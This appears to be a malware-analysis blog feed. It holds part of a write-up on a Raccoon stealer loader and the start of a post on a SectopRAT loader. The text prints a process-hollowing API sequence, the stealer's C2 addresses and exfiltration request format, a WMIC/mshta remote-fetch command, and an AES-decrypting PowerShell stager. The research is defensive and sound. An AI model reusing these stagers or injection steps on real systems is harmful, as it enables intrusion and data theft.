</figure></p>
<p>Regardless, the contents of the resource are returned as a byte array. Next, a method loops over every byte of the array, performing the following action:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#">byte_array[num] = ( ( toInt32((byte_array[num] ^ string_array[num % array_array.length])) - toInt32(byte_array[(num + <span style="color:#ae81ff">1</span>)]) ) + <span style="color:#ae81ff">256</span> ) % <span style="color:#ae81ff">256</span>
</code></pre></div><p>It takes each byte, XORs it with a byte from the string &ldquo;zDJqayZgb&rdquo;, then subtracts the integer value of the byte one position ahead of it in the byte array, adds 256 to the result, and then performs modulus 256. The final value is converted back into a byte and replaces the original byte.</p>
<p>The loop runs while the iterator value is <code>&lt;=</code> the array length, so the first element gets operated on twice, at the beginning of the loop and at the very end. After the loop is complete, the last byte of the array is removed.</p>
<p>The end result is a byte array starting with <code>4D 5A</code> &ndash; looks like a PE header, probably the next stage of the malware.</p>
<h4 id="process-injection">Process Injection</h4>
<p>Once the byte array is created, the <code>Y4.pn.OcE()</code> method gets the current .NET common language runtime directory and prepends it to the string &ldquo;MSBuild.exe&rdquo;, creating the string <code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe</code>.</p>
<p>Note: A frozen version of MSBuild is included by default in .NET Framework 4, so a file should already exist in the location referenced by the string.</p>
<p>Next, <code>pn.RcF(&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe&quot;, byte_array)</code> is called. It is lengthy, so I&rsquo;ll list out the main points below.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#"><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Ti</span>{
	IntPtr daw
	IntPtr wa1
	<span style="color:#66d9ef">uint</span> caz
	<span style="color:#66d9ef">uint</span> ISt }
	
CreateProcessA(path_to_MSBuild,  <span style="color:#66d9ef">string</span>.Empty, IntPtr.Zero, IntPtr.Zero, <span style="color:#66d9ef">false</span>, <span style="color:#ae81ff">134217732</span>U, IntPtr.Zero, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">ref</span> xa, <span style="color:#66d9ef">ref</span> ti)
	- dwCreationFlags: <span style="color:#ae81ff">0</span>x08000004 -- CREATE_SUSPENDED and CREATE_NO_WINDOW
GetThreadContext(ti.wa1, thread_context_array)

ReadProcessMemory(ti.daw, thread_context_array[<span style="color:#ae81ff">41</span>] + <span style="color:#ae81ff">8</span>, buffer, <span style="color:#ae81ff">4</span>, <span style="color:#66d9ef">false</span>)
VirtualAllocEx(ta.daw, <span style="color:#ae81ff">0</span>x00400000, <span style="color:#ae81ff">0</span>x0001D000, <span style="color:#ae81ff">12288</span>, <span style="color:#ae81ff">64</span>)
	- Last argument, <span style="color:#ae81ff">64</span>, translates to <span style="color:#ae81ff">0</span>x40 or PAGE_EXECUTE_READWRITE
	- Argument <span style="color:#ae81ff">12288</span> translates to MEM_COMMIT &amp; MEM_RESERVE -- ensures bytes of reserved memory are zeroed <span style="color:#66d9ef">out</span>
	- Allocate memory inside of MSBuild.exe, equivalent to the size of the byte_array
WriteProcessMemory(ta.daw, <span style="color:#ae81ff">0</span>x00400000, byte_array, <span style="color:#ae81ff">0</span>x00000400, <span style="color:#66d9ef">ref</span> num4)
	- Writes the first <span style="color:#ae81ff">1024</span> bytes of byte_array <span style="color:#66d9ef">into</span> MSBuild.exe at <span style="color:#66d9ef">base</span> address <span style="color:#ae81ff">0</span>x00400000
	
BlockCopy(byte_array, <span style="color:#ae81ff">0</span>x00000400, new_array, <span style="color:#ae81ff">0</span>, new_array.Length)
	- new_array <span style="color:#66d9ef">is</span> of size <span style="color:#ae81ff">0</span>x17C00
	- Copies <span style="color:#ae81ff">0</span>x17C00 bytes <span style="color:#66d9ef">from</span> byte_array starting <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">0</span>x400
WriteProcessMemory(ti.daw, <span style="color:#ae81ff">0</span>x00401000, new_array, new_array.Length, <span style="color:#66d9ef">ref</span> num4)
	- Writes the new_array <span style="color:#66d9ef">into</span> MSBuild.exe at address <span style="color:#ae81ff">0</span>x00401000
	
BlockCopy(byte_array, <span style="color:#ae81ff">0</span>x00018000, new_array, <span style="color:#ae81ff">0</span>, new_array.Length)
	- new_array <span style="color:#66d9ef">is</span> of size <span style="color:#ae81ff">0</span>x00002A00
	- Copies <span style="color:#ae81ff">0</span>x2A00 bytes <span style="color:#66d9ef">from</span> byte_array starting <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">0</span>x00018000
WriteProcessMemory(ta.daw, <span style="color:#ae81ff">0</span>x00419000, new_array, new_array.Length, <span style="color:#66d9ef">ref</span> num4)
	- Writes the new_array <span style="color:#66d9ef">into</span> MSBuild.exe at address <span style="color:#ae81ff">0</span>x00419000
	
BlockCopy(byte_array, <span style="color:#ae81ff">0</span>x0001AA00, new_array, <span style="color:#ae81ff">0</span>, new_array.Length)
	- new_array <span style="color:#66d9ef">is</span> size <span style="color:#ae81ff">0</span>x200
	- Copies <span style="color:#ae81ff">0</span>x200 bytes <span style="color:#66d9ef">from</span> byte_array starting <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">0</span>x0001AA00
WriteProcessMemory(ta.daw, <span style="color:#ae81ff">0</span>x0041C000, new_array, new_array.Length, <span style="color:#66d9ef">ref</span> num4)
	- Writes the new_array <span style="color:#66d9ef">into</span> MSBuild.exe at address <span style="color:#ae81ff">0</span>x0041C000
	
WriteProcessMemory(ta.daw, <span style="color:#ae81ff">0</span>x00A58008, new_buffer, <span style="color:#ae81ff">4</span>, <span style="color:#66d9ef">ref</span> num4)
	- new_buffer contains: <span style="color:#ae81ff">0</span>x00004000
	- Appears to write to the PEB section of memory, but unsure
	
kernel32.SetThreadContext(ti.wa1, thread_context_array)
kernel32.ResumeThread(ti.wa1)
</code></pre></div><p>To summarize, an <code>MSBuild.exe</code> process is created in a suspended state, <code>VirtualAllocEx</code> is used to allocate memory within the process, the payload is injected by writing distinct blocks of the byte array to locations in memory, and finally the process thread is resumed.</p>
<p>I set a breakpoint in dnSpy before the execution of ResumeThread and dumped the payload from the memory of MSBuild. I then fixed the section headers in PEBear, leaving me with a new executable to analyze.</p>
<p>After this, the <code>Y4.pn.OcE()</code> method returns, and execution within the DLL is concluded.</p>
<p>After multiple layers, I&rsquo;ve reached the final stage. No more .NET, I&rsquo;ll have to use Ghidra and x32dbg going forward.</p>
<h2 id="stage-four-raccoon">Stage Four: Raccoon</h2>
<p>There is quite a bit to dive into in the final payload, so I will briefly outline each major piece.</p>
<p>Spoiler, the payload is the Raccoon stealer. The execution flow, configuration strings, and C2 IP addresses I will discuss below support this statement.</p>
<h4 id="import-functions">Import Functions</h4>
<p>Using PEStudio to do some initial checking, we can see the binary has has very few imports, but it doesn&rsquo;t appear to be packed.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/pestudio_first.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/pestudio_first.png"
            alt="pestudio_first"
            />
    </a>
    
</figure>
<p>It turns out, in the first function called by main, additional Win32 API functions are imported dynamically using <code>LoadLibraryA</code> and <code>GetProcAddress</code>.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/export_functions.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/export_functions.png"
            alt="export_functions"
            />
    </a>
    
</figure>
The method to decode the strings here is simple, the two arguments are XOR&rsquo;d with each other, using modulus to loop through the second argument when needed. The first string argument is composed of ASCII characters, both printable and non-printable control characters.</p>
<h4 id="mutex">Mutex</h4>
<p>Once the additional functions have been imported, it checks whether a mutex with the name <code>MilcoSoft_#Rip_X</code> exists, and if so, the process terminates. If the mutex does not exist, one is created, and execution continues. This is to ensure only one instance of the stealer is running at a time.</p>
<p>Note: Many of the functions in this binary contain hundreds of library calls with null parameters, creating junk code in an (assumed) attempt to make debugging more difficult.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/junk_functions.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/junk_functions.png"
            alt="junk_functions"
            />
    </a>
    
</figure></p>
<h4 id="string-decode">String Decode</h4>
<p>A function is called to decode a series of strings using the same method as the dynamic imports. Many of the decoded strings match findings in other writeups of the Raccoon stealer.</p>
<pre><code class="language-String" data-lang="String">sgnl_
tlgrm_
ews_
grbr_
dscrd_
\passwords.txt
</code></pre><p>The full list can be found <a href="https://pastebin.com/VjUrW6DW">here</a>.</p>
<h4 id="nt-authoritysystem-check">NT Authority/System Check</h4>
<p>Using OpenProcessToken and GetTokenInformation, check whether the process is currently running under the local System user by checking the user SID of the current process against the string <code>S-1-5-18</code>.
If the SIDs match, CreateToolhelp32Snapshot, DuplicateTokenEx, and CreateProcessWithTokenW are used to duplicate the token of <code>explorer.exe</code>, and a new process is created with the token.</p>
<h4 id="decode-c2-ips">Decode C2 IPs</h4>
<p>Raccoon Stealer allows for operators to configure five command and control server IP addresses, however in this sample, only two were used. The IPs are hard-coded in the binary as ASCII strings, including non-printable characters. They are decoded by XORing each character against characters in corresponding indices of another hardcoded string, <code>f26f614d4c0bc2bcd6601785661fb5cf</code>. We will see this second string used again later.</p>
<pre><code class="language-String" data-lang="String">http://83.217.11.34
http://83.217.11.35
</code></pre><p>These IPs are well documented as associated with Raccoon Stealer.</p>
<h4 id="device-fingerprint">Device Fingerprint</h4>
<p>Before contacting any C2 servers, the malware collects device identifiers. RegOpenKeyExW is used to get the GUID of the device from the key <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid</code> and GetUserNameW grabs the current user&rsquo;s name.</p>
<p>These identifiers are used to create a string in the following format, where the configId is the XOR key previously used to decode the C2 IPs:</p>
<pre><code class="language-String" data-lang="String">machineId=&lt;GUID&gt;|&lt;username&gt;&amp;configId=f26f614d4c0bc2bcd6601785661fb5cf
</code></pre><h4 id="get-config-from-c2">Get Config From C2</h4>
<p>Use the WinINet API to POST the device fingerprint to the first C2 server, <code>http://83.217.11.34/</code>, with the header string <code>Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\r\n\r\n</code> and the User-Agent <code>901785252112</code>.  If any errors occur, it will attempt to make this request five times.</p>
<p>The InternetReadFile function is then used to capture the response from the C2 server, and save it to a variable. The response will be used to configure the functionality of the stealer. I&rsquo;ve shared the string with line breaks <a href="https://pastebin.com/y2hWwKXw">here</a>.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/c2_response.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/c2_response.png"
            alt="c2_response"
            />
    </a>
    
</figure></p>
<h4 id="download-dlls">Download DLLs</h4>
<p>The first section of the response from the C2 server contains paths to additional DLLs hosted on the C2 server.</p>
<pre><code class="language-Strings" data-lang="Strings">freebl3.dll
mozglue.dll
msvcp140.dll
nss3.dll
softokn3.dll
sqlite3.dll
vcruntime140.dll
</code></pre><p>The malware looks for the each occurrence of the string <code>libs_</code>, extracts the DLL name and its corresponding IP/path string, and uses the WinINet API to download the file from the server to the <code>C:\Users\&lt;user&gt;\AppData\LocalLow\</code> folder. In this case, the User-Agent for the requests is <code>1235125521512</code>.</p>
<p>All of the downloaded DLLs are all legitimate versions, which will be used to steal data from various locations on the system.</p>
<h4 id="new-token">New Token</h4>
<p>Check for the existence of the string <code>token:</code> in the C2 server response, and if it does not exist, the process terminates completely.</p>
<p>If it does exist, the token following the keyword is extracted and used to create a new string in the format <code>http://83.217.11.34/&lt;new_token&gt;</code>.</p>
<h4 id="environment-variable">Environment Variable</h4>
<p>Using the GetEnvironmentVariable and SetEnvironmentVariableW functions, the malware adds the directory <code>C:\Users\&lt;user&gt;\AppData\LocalLow</code> to the PATH environment variable.</p>
<h4 id="collect-system-information">Collect System Information</h4>
<p>Queries registry keys or uses Win32 APIs to construct a long string containing information about the system on which it is running. The output will be in the following format:</p>
<pre><code class="language-String" data-lang="String">System Information: 
	- Locale: English
	- Time zone: 	
	- OS: Windows 10 Home
	- Architecture: x64
	- CPU: Intel(R) Core(TM) i7-6700 CPU @ 340GH (2 cores)
	- RAM: 4095 MB
	- Display size: 1536x781
	- Display Devices:
		0) NVIDIA GeForce GTX 580

Installed applications:
	010 Editor 1201 (64-bit) 
	7-Zip 1505 beta x64 
	...
	&lt;many more&gt;
</code></pre><p>The installed applications are found using the following registry keys:</p>
<pre><code class="language-String" data-lang="String">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall
</code></pre><h4 id="post-system-data-to-c2">POST System Data To C2</h4>
<p>A header for a web request is created using a randomly generated string as the boundary field.</p>
<pre><code class="language-String" data-lang="String"> Content-Type: multipart/form-data; boundary=uQuoaXzGzkghm4gR\r\n\r\n\r\n
</code></pre><p>The boundary string will be used to delimit the system information in the POST request.</p>
<p>Send a POST request containing the data collected to the C2 server. The request will be in the following format:</p>
<pre><code class="language-String" data-lang="String">POST /&lt;token&gt; HTTP/1.1
Accept: */*
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
User-Agent: 125122112551
Host: 83.217.11.34
Content-Length: &lt;length&gt;
Connection: Keep-Alive
Cache-Control: no-cache
–&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;System Info.txt&quot;
Content-Type: multipart/form-data
System Information: 
	- Locale: English
	- Time zone: 	
	- OS: Windows 10 Home
	- Architecture: x64
	- CPU: Intel(R) Core(TM) i7-6700 CPU @ 340GH (2 cores)
	- RAM: 4095 MB
	- Display size: 1536x781
	- Display Devices:
		0) NVIDIA GeForce GTX 580
Installed applications:
	010 Editor 1201 (64-bit) 
	7-Zip 1505 beta x64 
	...
	&lt;many more&gt;
--&lt;boundary&gt;--
</code></pre><h4 id="data-theft">Data Theft</h4>
<p>After the system information is exfiltrated, the malware begins to steal more sensitive data. In the interest of brevity, I am not going to dig any further into the functionality here. There are many other writeups which do a great job of this. I will simply list the items which this sample is configured to steal.</p>
<pre><code class="language-String" data-lang="String">Browser Data
Various Crypto wallets from software/extensions
	BlockstreamGreen
	TronLink
	MetaMask
	Binance
	Ronin
	JaxxLiberty
	Atomic
	Coinomi
	Electrum
	ElectronCash
	Guarda
	LedgerLive
	Daedalus
	MyMonero
	Wasabi
Local Documents
	%USERPROFILE%\Desktop\|*.txt
	%USERPROFILE%\Desktop\|*.dox
	%USERPROFILE%\Documents\|*.txt
	%USERPROFILE%\Desktop\|*.pdf
Telegram
Discord
</code></pre><p>Each one of these stealer functions would upload the data to the C2 server immediately after capturing it.</p>
<h4 id="screenshots">Screenshots</h4>
<p>The Raccoon stealer has the capability to take screenshots using the GDIPlus and gdi32 DLLs, but this sample is not configured to do so.</p>
<h4 id="load-more-malware">Load More Malware</h4>
<p>The stealer uses the keyword <code>ldr_</code> in the C2 configuration string to determine whether to download even more malware. In this sample, I found the following:</p>
<pre><code class="language-String" data-lang="String">ldr_1:http://77.73.134.24/Clip1.exe|%APPDATA%\|exe
ldr_1:http://77.73.134.35/bebra.exe|%TEMP%\|exe
</code></pre><p>The configuration specifies the server to contact, the file to download, the path to save the download, and the extension to use. I collected these additional binaries, and they can be found on Malshare.</p>
<ul>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=471804a84bc2fa7969bf6ea4e1047e4f3aa1a5f535dad9ff696fc1ae349f885f">Clip1.exe</a>
<ul>
<li>Uses EazFuscator, and I&rsquo;m unable to get any deobfuscators to work. I do not have a lot of experience in this area.</li>
</ul>
</li>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=e487cc9c5d05a910d82c833029b1dc9ac00e5729ad05d1dcfafaa4fc64496b6d">bebra.exe</a></li>
</ul>
<h3 id="final-thoughts">Final Thoughts</h3>
<p>I&rsquo;ll summarize the investigative journey - first a malicious .NET binary was downloaded from a link in a YouTube video for cracked software. This binary has a weakly obfuscated .NET DLL embedded in its resources, which is extracted and a specified method is executed.</p>
<p>The first DLL then decrypts and decompresses another .NET DLL from its resources. and then uses methods from the newly created DLL to extract yet another DLL hidden inside a resource bitmap file.</p>
<p>The third DLL extracts the Raccoon stealer from its embedded resources, and injects it into a newly created MSBuild.exe process.</p>
<p>A visual guide: <code>.NET binary -&gt; .NET DLL -&gt; .NET DLL -&gt; .NET DLL -&gt; Raccoon Stealer</code></p>
<h4 id="iocs">IOCs</h4>
<pre><code class="language-string" data-lang="string">83.217.11.34
83.217.11.35
77.73.134.24
77.73.134.35

softwarebeginner.com
emanagesoftware.com/download
bestdogdaycaresoftware.com/1
bittab.pw/SoftwareSetupFile.rar
</code></pre>]]></content>
        </item>
        
        <item>
            <title>SectopRAT Loader - Updates</title>
            <link>https://rerednawyerg.github.io/posts/malwareanalysis/gad_sectoprat_update/</link>
            <pubDate>Thu, 16 Feb 2023 17:23:57 -0600</pubDate>
            
            <guid>https://rerednawyerg.github.io/posts/malwareanalysis/gad_sectoprat_update/</guid>
            <description>This will be a relatively short writeup, detailing some interesting new wrinkles I uncovered regarding a SectopRAT loader.
I was collecting screenshots for my last blog post when I noticed an open directory on pputty[.]us, the site to which a malicious Google ad pointed.</description>
            <content type="html"><![CDATA[
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.css" integrity="sha256-sCl5PUOGMLfFYctzDW3MtRib0ctyUvI9Qsmq2wXOeBY=" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/default-skin/default-skin.min.css" integrity="sha256-BFeI1V+Vh1Rk37wswuOYn5lsTcaU96hGaI7OUVCLjPc=" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.js" integrity="sha256-UplRCs9v4KXVJvVY+p+RSo5Q4ilAUXh7kpjyIP5odyc=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe-ui-default.min.js" integrity="sha256-PWHOlUzc96pMc8ThwRIXPn8yH4NOLu42RQ0b9SpnpFk=" crossorigin="anonymous"></script>


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="/js/pswp-init.js"></script>

<p>This will be a relatively short writeup, detailing some interesting new wrinkles I uncovered regarding a SectopRAT loader.</p>
<p>I was collecting screenshots for my last blog post when I noticed an open directory on <code>pputty[.]us</code>, the site to which a malicious Google ad pointed. It seemed the threat actor had been adding new files, perhaps new methods of initial access.</p>
<p>Naturally, being curious, I pulled them all down to investigate.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/starter.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/starter.png"
            alt="starter"
            />
    </a>
    
</figure>
<h3 id="url-files">.URL Files</h3>
<p>As I investigated, the logical starting point was revealed as the <code>.url</code> files:</p>
<ul>
<li>Setup.url</li>
<li>Simulator.url</li>
<li>Software.url</li>
<li>Webex.url</li>
</ul>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/software_url_file.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/software_url_file.png"
            alt="software_url_file"
            />
    </a>
    
</figure>
<p>In Windows, a <code>.url</code> file will automatically open a browser to a specific URL when double clicked.  The URL to be contacted can be found in the file properties.</p>
<p>In this case, all four files had the same URL property:</p>
<pre><code class="language-URL" data-lang="URL">file:\\179.43.142[.]86@80\Downloads\1111.lnk
</code></pre><p>Double-clicking this file will cause the following pop-up to appear.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/url_file_success.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/url_file_success.png"
            alt="url_file_success"
            />
    </a>
    
</figure></p>
<p>If the &ldquo;Open&rdquo; button is clicked, a Windows shortcut, <code>1111.lnk</code>, will be executed.</p>
<p>Opening up the properties of the identically named shortcut I had downloaded from the open directory, the first thing I noticed is the description: &ldquo;WMI Commandline Utility&rdquo;. Interesting.</p>
<p>Taking a look at the target field in the Shortcut tab, I can see that when executed, the <code>.lnk</code> file will run the following line (in a minimized window):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">C:\Windows\System32\wbem\WMIC.exe <span style="color:#66d9ef">process</span> call create <span style="color:#e6db74">&#34;powershell  . C:\*i*\S*3*\m*ta.e* https://pputty[.]us/1.hta&#34;</span>
</code></pre></div><p>Something I learned here, PowerShell can use wildcards in file paths and will not complain. To PowerShell, <code>C:\*i*\S*3*\m*ta.e*</code> is equivalent to <code>C:\Windows\System32\mshta.exe</code>.</p>
<p>A bit about mshta from the Microsoft <a href="https://learn.microsoft.com/en-us/previous-versions//ms536471(v=vs.85)?redirectedfrom=MSDN">docs</a>: &ldquo;mshta is a Windows utility which executes HTML Application files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.&rdquo;</p>
<p>A summary so far. A <code>.url</code> file calls out to an IP and executes a <code>.lnk</code> file, which in turn uses PowerShell to run an <code>.hta</code> file with mshta.exe. Let&rsquo;s see what the <code>.hta</code> holds!</p>
<h3 id="hta-file">.hta File</h3>
<p>The <code>.hta</code> file was mostly placeholder HTML, with three very messy, but important lines.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/hta_raw.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/hta_raw.png"
            alt="hta_raw"
            />
    </a>
    
</figure>
<p>After some cleaning, things started to make more sense.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/1_hta_cleaned.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/1_hta_cleaned.png"
            alt="1_hta_cleaned"
            />
    </a>
    
</figure>
<p>A large number of variables were created and set to integer values. Using &ldquo;ChrW&rdquo;, which returns a readable Unicode or ASCII character, a single variable is created.</p>
<p>Without the thousands of quotation marks, the third line boils down to <code>Execute Eval(res))</code>, which will execute whatever is passed to it, in this case, the &ldquo;res&rdquo; variable. By commenting out this line, I can just write it to the console to inspect it.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/1_hta_output.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/1_hta_output.png"
            alt="1_hta_output"
            />
    </a>
    
</figure>
<p>More VBS. After cleaning it up, it is quite straightforward, so I won&rsquo;t bore with details. The obfuscation/functions here are simply to hide the creation of a WScript.Shell object. Once the object is created, it runs a command passed to it as a string, without showing a popup window.</p>
<p>I copied the PowerShell out of the argument string, and began to analyze it.</p>
<h3 id="powershell-script">PowerShell Script</h3>
<p>Below is the PowerShell called by the WScript.Shell object.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">powershell.exe -ExecutionPolicy UnRestricted Start-Process <span style="color:#e6db74">&#39;cmd.exe&#39;</span> -WindowStyle hidden -ArgumentList {/c powershell.exe $RpboyN = <span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAPhV/VZ6nliBpw0blRhYHFy8uOMZrCs004iC/zUNLNU+HMua76DNadYaA9soXAQC7haP7Id8A08qD8pvMK/V6arPhdbP/a2Osqu10DKceGWI3qaw+nzPAfDUJ35pavHM3PetLyPWhvypz7eQIzvfkNJGl0USK1lh2+iZeWjYT08jd3N33rvhoRnZ6NCOr86BBTw/rYh+aeQl7pfvacq1xAvHvZoOXBBL1pSQxdM22OMCO57JV5dAy0/6IGnA0rM0J6hOBA5g/qKydwjKo5C+1NN0iF/ewdiZbOf9SFvRWhIoP6zNK/W6KioKxR604X7MQJz8HpgQvAOgRdTiYcPs7iWxXu6lJsQvFQ1peat8b8tO3C/kUT6eenSeeVwJyeLHb3U+GGcGZODSjIXdo3IiS7y4hbw0CPqFUd96jxArpvuySF2lO/hwYyWOZZrxS5cij0U1ECgL7kdSpKLAVHo1nwyq8AOEQcQuvRL7+w32vIFHmO27HAY5P3ELFhI0Yr99+oez3yD73f2U3/zJBvd8ropF7PafpRv9DIhLQnL3v6tAVzSGMMLdiofZYn3mAZ0ffebrP8R+Nuiq6LZD2P22RB/gl2Oact+1XIEcPNTaNHWxdGClp8QPPr++SdYN/0+u8t91Q2C3JNj3F9yYLESJ8xUyBsK+ot3voYmk9HPHkD6rxkuKFjeMTAe5OxJeEsJw9VcuA7qZEBXsdCnnoUPI1PN7kabdxmNLmh5fYVqxUg7dihQPLmkiNH6kMWj8bpM3gJhk0OCWNg2z9S2UcI4uOHrOlJnF2ubUXNpPSAd+8jXZLzx3o7na1ijV976he5Q/vfpFFUXtJjm4bMr/0vA2RyFM98wVlw5QJ1SIS6yxGvGkvqVt+r3RmACMkkVsUNkM/cFBcYW+SAMPQcrIVH7Pr31+hrwpT9vaI1+rIuNK4Gxn9WSTxTW0r/kDj086H9bJhA==&#39;</span>;
$bjpawLP = <span style="color:#e6db74">&#39;d0dJZmhTRnRma1JIeVhwWFRscmtseXZ5UndqU1hiaXE=&#39;</span>;
$LTqnWUJ = New-Object <span style="color:#e6db74">&#39;System.Security.Cryptography.AesManaged&#39;</span>;
$LTqnWUJ.Mode = <span style="color:#66d9ef">[System.Security.Cryptography.CipherMode]</span>::ECB;
$LTqnWUJ.Padding = <span style="color:#66d9ef">[System.Security.Cryptography.PaddingMode]</span>::Zeros;
$LTqnWUJ.BlockSize = 128;
$LTqnWUJ.KeySize = 256;
$LTqnWUJ.Key = <span style="color:#66d9ef">[System.Convert]</span>::FromBase64String($bjpawLP);
$NopMN = <span style="color:#66d9ef">[System.Convert]</span>::FromBase64String($RpboyN);
$nOAYBEJe = $NopMN[0..15];
$LTqnWUJ.IV = $nOAYBEJe;
$oiOyGuVja = $LTqnWUJ.CreateDecryptor();
$QXEoeqPMj = $oiOyGuVja.TransformFinalBlock($NopMN, 16, $NopMN.Length - 16);
$LTqnWUJ.Dispose();
$CoCn = New-Object System.IO.MemoryStream( , $QXEoeqPMj );
$tExvHMy = New-Object System.IO.MemoryStream;
$osHkaSVDa = New-Object System.IO.Compression.GzipStream $CoCn, (<span style="color:#66d9ef">[IO.Compression.CompressionMode]</span>::Decompress);
$osHkaSVDa.CopyTo( $tExvHMy );
$osHkaSVDa.Close();
$CoCn.Close();
<span style="color:#66d9ef">[byte[]]</span> $EVpkPWyQ = $tExvHMy.ToArray();
$VIYlM = <span style="color:#66d9ef">[System.Text.Encoding]</span>::UTF8.GetString($EVpkPWyQ);
$VIYlM | powershell - }
</code></pre></div><p>I can tell immediately that AES decryption is occurring, likely on the base64 looking string. I confirmed this by cleaning things up a bit.</p>
